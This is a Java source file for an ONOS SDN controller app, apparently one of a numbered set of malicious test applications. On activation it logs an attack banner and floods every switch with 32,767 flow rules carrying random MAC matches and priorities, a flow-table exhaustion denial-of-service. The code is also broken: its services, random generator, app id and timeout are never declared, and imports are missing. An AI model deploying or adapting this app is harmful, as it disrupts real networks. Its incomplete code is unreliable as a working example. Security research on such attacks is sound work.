/*
 * Copyright 2017-present Open Networking Laboratory
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.app8;

import com.google.common.collect.Lists;
import org.apache.felix.scr.annotations.*;
import org.onosproject.app.ApplicationAdminService;
import org.onosproject.core.Application;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * Application that tries to flood switches with useless flows
 */
@Component(immediate = true)
public class AppComponent {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Activate
    protected void activate() {
        log.info("Application 8 started : beginning flooding on switches");

        System.out.println("[ATTACK] Flow_Rule_Flooding");
        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();

            for (int i = 0; i < 32767; i++) {
                selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
                FlowRule newf = new DefaultFlowRule(piece.id(),
                        selector.build(), treat.build(), ran.nextInt(32767),
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);
            }
        }
    }

    @Deactivate
    protected void deactivate() {
        log.info("Application 8 stopped");
    }
}
